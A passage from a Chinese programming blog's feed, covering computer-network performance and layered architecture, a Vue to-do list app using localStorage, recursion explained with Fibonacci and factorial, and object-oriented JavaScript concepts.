alt="image-20210418142506439"></p></li><li><p>传播时延</p><p>电磁波在信道中需要传播一定的距离而花费的时间。 发送时延与传播时延有本质上的不同。信号发送速率和信号在信道上的传播速率是完全不同的概念。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418142558278.png" alt="image-20210418142558278"></p></li><li><p>处理时延</p><p>主机或路由器在收到分组时，为处理分组（例如分析首部、提取数据、差错检验或查找路由）所花费的时间。 </p></li><li><p>排队时延</p><p>分组在路由器输入输出队列中排队等待处理所经历的时延。<strong>排队时延的长短往往取决于网络中当时的通信量。</strong></p></li></ol><p>最后，数据在网络中经历的<strong>总时延</strong>就是发送时延、传播时延、处理时延和排队时延之和。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418142718090.png" alt="image-20210418142718090"></p><p>需要重点注意到饿是：对于高速网络链路，我们<strong>提高的仅仅是数据的发送速率</strong>而不是比特在链路上的传播速率。 提高链路带宽减小了数据的发送时延。 </p><h2 id="时延带宽积"><a href="#时延带宽积" class="headerlink" title="时延带宽积"></a>时延带宽积</h2><p>链路的时延带宽积又称为以比特为单位的链路长度。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418142919756.png" alt="image-20210418142919756"></p><p>只有在代表链路的管道都充满比特时，链路才得到了充分利用。</p><blockquote><p>时延带宽积 = 传播时延 × 带宽</p></blockquote><h2 id="往返时间"><a href="#往返时间" class="headerlink" title="往返时间"></a>往返时间</h2><p>互联网上的信息不仅仅单方向传输，而是双向交互的。因此，有时很需要知道双向交互一次所需的时间。</p><p>往返时间 RTT (round-trip time) 表示从发送方发送数据开始，到发送方收到来自接收方的确认，总共经历的时间。(运输层会详细聊到这个)</p><p>在互联网中，往返时间还包括各中间结点的处理时延、排队时延以及转发数据时的发送时延。</p><p><strong>当使用卫星通信时，往返时间 RTT 相对较长，是很重要的一个性能指标。</strong></p><h2 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h2><p>分为信道利用率和网络利用率。</p><ol><li>信道利用率指出某信道有百分之几的时间是被利用的（有数据通过）。完全空闲的信道的利用率是零。</li><li>网络利用率则是全网络的信道利用率的加权平均值。</li></ol><p><strong>信道利用率并非越高越好。当某信道的利用率增大时，该信道引起的时延也就迅速增加。</strong></p><p>我们知道，时延和信道上数据传播速率有关，假设速率不变的情况下，时延又分为四种，当你利用率提高的同时，其中的一种——排队时延就会相应的变长，那么总的时延就会增加</p><p>若令 D0 表示网络空闲时的时延，D 表示网络当前的时延，则在适当的假定条件下，可以用下面的简单公式表示 D 和 D0 之间的关系： </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418143620011.png" alt="image-20210418143620011"></p><p>其中：U 是网络的利用率，数值在 0 到 1 之间。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418143637381.png" alt="image-20210418143637381"></p><h1 id="非性能特征"><a href="#非性能特征" class="headerlink" title="非性能特征"></a>非性能特征</h1><p>当然，一些非性能特征也很重要。它们与前面介绍的性能指标有很大的关系。主要包括：</p><ul><li>费用</li><li>质量</li><li>标准化</li><li>可靠性</li><li>可扩展性和可升级性 </li><li>易于管理和维护 </li></ul><h1 id="协议与划分层次"><a href="#协议与划分层次" class="headerlink" title="协议与划分层次"></a>协议与划分层次</h1><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>计算机网络中的数据交换<strong>必须遵守事先约定好的规则</strong>。 </p><p>这些<strong>规则</strong>明确规定了所交换的数据的格式以及有关的同步问题（同步含有时序的意思）。</p><p><strong>网络协议</strong> (network protocol)，简称为<strong>协议</strong>，是为进行网络中的数据交换而建立的规则、标准或约定。</p><h3 id="网络协议的三个组成要素"><a href="#网络协议的三个组成要素" class="headerlink" title="网络协议的三个组成要素*"></a>网络协议的三个组成要素*</h3><p><strong>语法</strong>：数据与控制信息的结构或格式 。 </p><p><strong>语义：</strong>需要发出何种控制信息，完成何种动作以及做出何种响应。 </p><p><strong>同步</strong>：事件实现顺序的详细说明。 </p><h3 id="协议具有两种形式"><a href="#协议具有两种形式" class="headerlink" title="协议具有两种形式"></a>协议具有两种形式</h3><p>一种是使用便于人来阅读和理解的文字描述。</p><p>另一种是使用让计算机能够理解的程序代码。</p><p>这两种不同形式的协议都必须能够对网络上信息交换过程做出精确的解释。</p><h2 id="划分层次"><a href="#划分层次" class="headerlink" title="划分层次"></a>划分层次</h2><p>划分层次的优点，以及它的缺点</p><p>优点</p><ul><li>各层之间是独立的。</li><li>灵活性好。</li><li>结构上可分割开。</li><li>易于实现和维护。</li><li>能促进标准化工作。  </li></ul><p>缺点</p><ul><li>降低效率。</li><li>有些功能会在不同的层次中重复出现，因而产生了额外开销。</li></ul><p>而层数也要适合，如果层数太少，就会使每一层的协议太复杂。层数太多，又会在描述和综合各层功能的系统工程任务时遇到较多的困难。 </p><h1 id="计算机网络的体系结构"><a href="#计算机网络的体系结构" class="headerlink" title="计算机网络的体系结构"></a>计算机网络的体系结构</h1><p>计算机网络的体系结构 (architecture) 是计算机网络的各层及其协议的集合。 </p><p>体系结构就是这个计算机网络及其部件所应完成的功能的精确定义。<br>实现 (implementation) 是遵循这种体系结构的前提下用何种硬件或软件完成这些功能的问题。</p><p><strong>体系结构是抽象的，而实现则是具体的，是真正在运行的计算机硬件和软件。</strong></p><p><strong>OSI</strong> 的七层协议体系结构的概念清楚，理论也较完整，但它既复杂又不实用。</p><p><strong>TCP/IP</strong> 是四层体系结构：应用层、运输层、网际层和网络接口层。<br>但最下面的网络接口层并没有具体内容。</p><p>因此往往采取折中的办法，即综合 OSI 和 TCP/IP 的优点，采用一种只有五层协议的体系结构 。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418145642533.png" alt="image-20210418145642533"></p><p>在五层协议下，数据是这样传递的</p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/数据传递.jpg" alt="数据传递"><p>图里省略了到达通信接收方数据的处理方法，具体做法便是在每一层将数据对等层的首部和尾部<strong>剥去</strong>后再传递给上一层</p><p><strong>OSI 参考模型把对等层次之间传送的数据单位称为该层的协议数据单元 PDU (Protocol Data Unit)。</strong>这个名词现已被许多非 OSI 标准采用。</p><p>任何两个同样的层次把数据（即数据单元加上控制信息）通过水平虚线直接传递给对方。这就是所谓的“对等层”(peer layers)之间的通信。</p><p>各层协议实际上就是在各个对等层之间传递数据时的各项规定。</p><h2 id="实体、协议、服务和服务访问点"><a href="#实体、协议、服务和服务访问点" class="headerlink" title="实体、协议、服务和服务访问点"></a>实体、协议、服务和服务访问点</h2><p><strong>实体 (entity)</strong> 表示任何可发送或接收信息的硬件或软件进程。 </p><p><strong>协议</strong>是控制<strong>两个对等实体</strong>进行通信的规则的集合。 </p><p>在协议的控制下，两个对等实体间的通信使得本层能够向上一层<strong>提供服务</strong>。</p><p>要实现本层协议，还需要使用下层所提供的服务。 </p><p>协议的实现保证了能够向上一层提供服务。本层的服务用户只能看见服务而无法看见下面的协议。即下面的协议对上面的服务用户是透明的。 协议是“水平的”，即协议是控制对等实体之间通信的规则。服务是“垂直的”，即服务是由下层向上层通过层间接口提供的。上层使用服务原语获得下层所提供的服务。</p><p>同一系统相邻两层的实体进行交互的地方，称为<strong>服务访问点 SAP</strong> (Service Access Point)。 服务访问点SAP是一个抽象的概念，它实际上就是一个逻辑接口。OSI把层与层之间交换的数据的单位称为<strong>服务数据单元 SDU</strong> (Service Data Unit)。SDU 可以与 PDU 不一样，例如，可以是多个 SDU 合成为一个 PDU，也可以是一个 SDU 划分为几个 PDU。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418150946900.png" alt="image-20210418150946900"></p><p>协议必须把所有不利的条件事先都估计到，而不能假定一切都是正常的和非常理想的。 看一个计算机网络协议是否正确，不能光看在正常情况下是否正确，还必须非常仔细地检查这个协议能否应付各种异常情况。 </p><h1 id="TCP-IP-的体系结构"><a href="#TCP-IP-的体系结构" class="headerlink" title="TCP/IP 的体系结构"></a>TCP/IP 的体系结构</h1><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418151028155.png" alt="image-20210418151028155"></p><p>实际上，现在的互联网使用的 TCP/IP 体系结构有时已经发生了演变，即某些应用程序可以直接使用 IP 层，或甚至直接使用最下面的网络接口层。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418151050239.png" alt="image-20210418151050239"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418151123598.png" alt="image-20210418151123598"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418151137382.png" alt="image-20210418151137382"></p><p>客户进程和服务器进程使用 TCP/IP 协议栈进行通信</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418151152180.png" alt="image-20210418151152180"></p><p>功能较强的计算机可同时运行多个服务器进程 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418151236957.png" alt="image-20210418151236957"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Vue的新拟态版ToDoList（待办事项）</title>
      <link href="/2021/04/03/%E6%96%B0%E6%8B%9F%E6%80%81todolist/"/>
      <url>/2021/04/03/%E6%96%B0%E6%8B%9F%E6%80%81todolist/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>基于Vue半全家桶的新拟态板ToDoList，一个todolist而已，用几乎Vue全家桶是不是有点小题大做，是的，必须的，因为要巩固的知识，并且功能也相应的增加了，你可以打卡想看的书或者电影，以及小小的改变了todolist的相应逻辑，当天未完成的ToDo会累计到待完成任务，看着一天一天积下来的待办，多多少少希望减少你的惰性吧（希望目的达到），从而激发你一天满满的动力</p><p><strong>注意：所使用的是localStorage存储数据（没用服务器），所以，如果你一不小心用了什么清垃圾软件或者手动清掉浏览器数据的话，它会消失，它会消失，它会消失</strong></p><p>采用纯less写样式，只写了PC端响应式布局，没做移动端适配（就不要尝试用手机打开了，大丑）</p><p><a href="https://ypigy.gitee.io/todolist" target="_blank" rel="noopener">在线地址</a></p><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ol><li>输入代办，按下回车键，添加到当天待办事项</li><li>点击完成按钮，完成该代办，添加至完成事项</li><li>点击删除按钮，删除该待办</li><li>动态显示已完成和未完成事项数量</li><li>当天未完成待办，第二天添加至待完成任务，可在第二天点击“今天完成”重新添加至我的一天中</li><li>阅读选项打卡想看的书</li><li>电影选项卡打卡想看的电影</li><li>点击头像就是回到我的博客啦</li><li>导航栏右侧文字根据时间改变相应问候语</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/03/%E6%96%B0%E6%8B%9F%E6%80%81todolist/image-20210403153631218.png" alt="image-20210403153631218"></p><p><img src= "/img/loading.gif" data-src="/2021/04/03/%E6%96%B0%E6%8B%9F%E6%80%81todolist/image-20210403165129933.png" alt="image-20210403165129933"></p><h1 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a>技术架构</h1><ul><li>Vue</li><li>Vue CLI</li><li>Vue Router</li><li>Less</li><li>webpack</li></ul><h1 id="组件划分"><a href="#组件划分" class="headerlink" title="组件划分"></a>组件划分</h1><p><img src= "/img/loading.gif" data-src="/2021/04/03/%E6%96%B0%E6%8B%9F%E6%80%81todolist/image-20210403172406380.png" alt="image-20210403172406380"></p><p>主要划分为三个大组件</p><p><strong>NavBar</strong></p><ul><li>分为左中右三个插槽</li><li>中间添加待办事项</li><li>左插槽展示当前路由信息</li><li>右插槽按时间显示问候信息</li></ul><p><strong>SideBar</strong></p><ul><li>用来控制路由的主要组件</li><li>分为两个部分，一个头像模块，一个路由切换模块</li><li>路由切换模块放置切换路由的小item</li></ul><p><strong>TaskBar</strong></p><ul><li>放置待办的组件</li><li>根据待办状态显示不同状态的item</li></ul><h1 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h1><p>最重要的当然就是侦听数据的改变啦，毕竟你时时刻刻都在改变数据，vue官网<a href="https://cn.vuejs.org/v2/api/#watch" target="_blank" rel="noopener">watch函数介绍</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//监听数据变化</span></span><br><span class="line">watch: &#123;</span><br><span class="line">  mydayList: &#123;</span><br><span class="line">    <span class="comment">// 该回调会在任何被侦听的对象的 mydayList 改变时被调用，不论其被嵌套多深</span></span><br><span class="line">    handler()&#123;</span><br><span class="line">      saveData( <span class="keyword">this</span>.mydayList, <span class="string">"myday"</span>)</span><br><span class="line">      getData()</span><br><span class="line">    &#125;,</span><br><span class="line">    deep: <span class="literal">true</span>          </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过监听mydayList数据的变化，实时保存改变后的数据以及加载保存后的数据</p><p>其它就是简单的localStorage增删改查操作啦</p><h1 id="函数封装"><a href="#函数封装" class="headerlink" title="函数封装"></a>函数封装</h1><p>这里通过函数封装，得到localStorage增删查操作，并单独设置成一个js文件，后面组件需要用到即可直接导入使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取本地数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params">dataName</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// localStorge为window内置属性，用于在浏览器存储本地信息</span></span><br><span class="line">  <span class="comment">// 该数据除非手动删除，否则会一直存在</span></span><br><span class="line">  <span class="comment">// let data = localStorage.getItem("todoList") //取值</span></span><br><span class="line">  <span class="keyword">let</span> data = localStorage.getItem(dataName) <span class="comment">//取值</span></span><br><span class="line">  <span class="keyword">if</span> (data !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">//ES6将变量作为键→[变量名]</span></span><br><span class="line">    <span class="comment">// return JSON.parse(data).[dataName] //将数据转换为json</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(data)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存本地数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveData</span>(<span class="params">data, dataName</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//JSON.stringify()将json数据转换为字符串</span></span><br><span class="line">  localStorage.setItem(dataName, <span class="built_in">JSON</span>.stringify(data)) <span class="comment">//设值    </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteData</span>(<span class="params">index, dataName</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//获取本地数据</span></span><br><span class="line">  <span class="keyword">let</span> data = getData(dataName)</span><br><span class="line">  <span class="comment">// let index = index //获取索引号</span></span><br><span class="line">  <span class="comment">//改本地数据（删除数据）</span></span><br><span class="line">  data.splice(index, <span class="number">1</span>)</span><br><span class="line">  <span class="comment">//保存本地数据</span></span><br><span class="line">  saveData(data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面就是简单的给各个组件注册事件，然后执行相关操作就可以啦</p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> 新拟态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用斐波拉契数列理解递归</title>
      <link href="/2021/03/23/%E5%88%A9%E7%94%A8%E6%96%90%E6%B3%A2%E6%8B%89%E5%A5%91%E6%95%B0%E5%88%97%E7%90%86%E8%A7%A3%E9%80%92%E5%BD%92/"/>
      <url>/2021/03/23/%E5%88%A9%E7%94%A8%E6%96%90%E6%B3%A2%E6%8B%89%E5%A5%91%E6%95%B0%E5%88%97%E7%90%86%E8%A7%A3%E9%80%92%E5%BD%92/</url>
      
        <content type="html"><![CDATA[<p>递归是啥，你可以去谷歌一下，没有解答，你就会一直循环下去，直到你了解了递归是啥，这便是递归，哈哈哈哈哈，我自己都不相信自己说的自己能不能理解，怎么来和你们讲呢，好的，就让我们直接用实例去理解递归吧</p><p>可以看看这个<a href="https://www.zhihu.com/zvideo/1219550997229522944" target="_blank" rel="noopener">视频</a>先，形象了解下</p><h2 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h2><p>什么是斐波拉契数列，如下数字所示</p><p>1、1、2、3、5、8、13、21、34、55、…</p><p>看到规律了有没有，从第三个开始，他的值总会等于它前两个值相加，像这样→<strong>f(n - 1) + f(n - 2)(n &gt;= 3)</strong>，好的，目前看起来这个原理很容易理解，让我们来点难的，现在我直接问你，当n = 11时，对应的斐波拉契数是多少，啊这这这这，让我拿出一张纸先，好的你开始了推演，计算第11的斐波拉契数，它等于第10的斐波拉契数加第9的斐波拉契数，第10的斐波拉契数是啥，是第9＋第8的斐波拉契数…..最终我们来到了1，所以我需要从1开始算起，算到第11个数：继续1，然后1+1，然后(1+1)+1，接着((1+1)+1)+(1+1)，如下图所示</p><p><img src= "/img/loading.gif" data-src="/2021/03/23/%E5%88%A9%E7%94%A8%E6%96%90%E6%B3%A2%E6%8B%89%E5%A5%91%E6%95%B0%E5%88%97%E7%90%86%E8%A7%A3%E9%80%92%E5%BD%92/image-20210311212046966.png" alt="image-20210311212046966"></p><p>最后我们来到了11这边，答案出来啦，就是89，这便是递归的过程，从哪里开始，从哪里结束，中间经历着一堆同样规则的计算</p><p>用网上的一个例子：你用你手中的钥匙（f(n - 1) + f(n - 2)）打开一扇门（n = 11），结果去发现前方还有一扇门（n=10)，紧接着你又用钥匙打开了这扇门，然后你又看到一扇门（n=9)，…，当你开到某扇门时（n = 2），发现前方是一堵墙(f(n) = 1(n = 1、2))无路可走了，你选择原路返回（(((((1+1)+1)+1)+1)+1)…）,最后返回最开始的门（n = 11）。</p><p>钥匙便是这个过程的规律（通用的关系式），第一个门就是你所需要求的值的索引，开过一个又一个需要相同钥匙开的门，墙便是终止条件，然后重新回去你就知道了你所求的值是什么，这便是整个过程了，这也就是递归</p><p>也可以通过下面的代码理解</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fac = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(n == <span class="number">1</span> || n == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fac(n<span class="number">-1</span>) + fac(n<span class="number">-2</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算斐波拉契数</span></span><br><span class="line"><span class="built_in">console</span>.log(fac(<span class="number">8</span>))</span><br></pre></td></tr></table></figure><p>在哪里使用递归，你可以按以下三点进行分析</p><ol><li><p>你想完成一个怎样的功能</p><p>斐波拉契数列</p></li><li><p>终止条件 </p><p>1</p></li><li><p>找出关系式 </p><p>fac(n-1) + fac(n-2)</p></li></ol><h2 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h2><p>接下来就让我们用递归解决阶乘的代码编写问题，按以下三点进行</p><ol><li><p>你想完成一个怎样的功能</p><p>当我给一个数字n时，计算出n以及n-1,n-2直到1时相乘的值</p></li><li><p>终止条件</p><p>1</p></li><li><p>找出关系式</p><p>n * f(n-1) </p></li></ol><p>开始编写代码</p><p>定义一个函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> jie = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写终止条件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算关系式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> n * jie(n<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> jie = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(n == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> jie(n<span class="number">-1</span>) * n</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这便是我所理解的递归，与循环不同，循环是按照一个规律一直进行下去，直到终止条件发生，便停止循环，简单来说，即有去无回。而递归便是有去有回，就是从哪里开始，就从哪里结束。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象的JavaScript</title>
      <link href="/2021/03/15/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84JavaScript/"/>
      <url>/2021/03/15/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84JavaScript/</url>
      
        <content type="html"><![CDATA[<blockquote><p>看了文章目录且看过《JS设计模式与开发实践》的同学是不是有点熟悉，本文章便是基于学习该书第一部分第一节所做的相关笔记以及个人心得</p></blockquote><h1 id="动态类型语言"><a href="#动态类型语言" class="headerlink" title="动态类型语言"></a>动态类型语言</h1><p>不知道之前大家是否学过其它面向对象语言——C#、JAVA等等，笔者之前是先学了C#,当时命名变量都要使用规定的数据类型，比如你要定义一个整型数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public int a &#x3D; 3; &#x2F;&#x2F;定义一个整型数值a</span><br></pre></td></tr></table></figure><p>又比如你要定义一个字符串类型的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public string a &#x3D; &#39;我是猪&#39;;</span><br></pre></td></tr></table></figure><p>按照编程语言的数据类型分类，这便是<strong>静态类型语言——在编译时便以确定变量的类型</strong></p><p>而到后面我学了JavaScript，第一次感觉到被变量类型释放，几乎一切数据类型都能var解决，要是不能，就用es6的let解决</p><p>不管你想数值型、字符串型、还是布尔型，通通var，通通var，<code>var a = 3</code>，<code>var a = &quot;我是猪&quot;</code></p><p>那这又是什么类型的语言呢，没错，正如标题——动态类型语言，来看看动态类型语言的特点</p><blockquote><p>动态类型的变量类型要到程序运行时，待变量被赋予某个值之后，才会具有某种类型</p></blockquote><p>我们的JavaScript便是这种类型的语言</p><p>那么，这两者又有什么优缺点呢，静态类型数据优点便是在刚开始编译时便能发现类型不匹配的错误，缺点便是——有点复杂，正如书所说，迫使程序员按照契约来编写程序；而动态类型语言则可以让代码看起来更简洁，程序员可以把更多的精力放在业务实现上，但就是无法保证变量的类型，从而使程序在运行过程中可能会发生与变量类型有关的错误</p><p>总结下，动态类型语言对变量类型的宽容给实际编码带来很大的灵活性。由于无需类型检测，我们可以尝试调用任何对象的任意方法，而无需考虑它原本是否被设计为拥有该方法，想一下，如果在C#，你定义不同类型的对象，但它们有同一个方法，而一个需求只需要具有该方法的对象，而不考虑它是属于何种类的，怎么实现呢，是不是很难（向上转型，强制类型转换）。书里有一个故事——鸭子类型，便形象生动的描述了该需求~嘎嘎嘎🦆</p><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>含义：同一操作作用于不同的对象上面，可以产生不同的解释和不同的执行结果</p></blockquote><p>也就是：你会唱歌，别人也会唱歌，但可能他会唱高音，而你，低音则更好听，则便是多态，两个人同样会唱歌这个动作，但是声音却不同</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> singing = <span class="function"><span class="keyword">function</span>(<span class="params">animal</span>) </span>&#123;</span><br><span class="line">  animal.singSong()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Human = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.singSong = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"啊~~"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Bird = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.singSong = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"叽叽喳喳"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">singing(<span class="keyword">new</span> Human())</span><br><span class="line">singing(<span class="keyword">new</span> Bird())</span><br></pre></td></tr></table></figure><p>好吧，这里拿了人和鸟来比了，准确来说可能是叫，问题不大</p><p>运行完，当然就是一个’啊啊啊’，一个’叽叽叽’啦</p><p>这就是多态</p><h2 id="使用继承来得到多态"><a href="#使用继承来得到多态" class="headerlink" 